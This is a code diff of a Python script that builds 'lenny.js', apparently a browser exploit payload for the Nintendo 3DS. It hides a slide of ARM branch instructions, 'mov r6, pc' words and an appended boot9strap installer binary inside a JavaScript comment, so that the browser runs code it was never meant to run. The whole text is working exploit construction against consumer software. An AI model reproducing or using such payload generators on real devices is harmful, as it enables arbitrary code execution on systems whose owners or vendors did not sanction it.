@@ -1,21 +1,17 @@
 import os,sys,struct
-
-data=struct.pack("<I", 0xe1a0600f)*(0xe0000//4)
-temp=b"var i=0/*aaa" + data + b"*/"
+size=0xfbe00
+data=[]
+jump=0xea000000+(size//4)
+movR6PC=0xe1a0600f
+for i in range(0, size, 4):
+	data.append(struct.pack("<I", jump))
+	jump-=1
+data=b''.join(data)
+data+=struct.pack("<I", movR6PC)*8
+with open("mini_b9s_installer/mini_b9s_installer.bin","rb") as f:
+	b9s=f.read()+(b"\x00"*0x1000)
+data+=b9s
+temp=b"var i=0/*aaa" + data + b"*/var x=2"
 
 with open("lenny.js","wb") as f:
 	f.write(temp)
-
-with open("mini_b9s_installer/mini_b9s_installer.bin","rb") as f:
-#with open("3ds_ropkit2/ropkit.bin","rb") as f:
-	b9s=f.read()
-
-mlen=len(temp)
-b9slen=len(b9s)
-
-target=(mlen-b9slen-0x20) & 0xfffffffc
-
-with open("lenny.js","rb+") as f:
-	for i in range(0x10000,0xe0000-1,0x20000):
-		f.seek(i)
-		f.write(b9s)
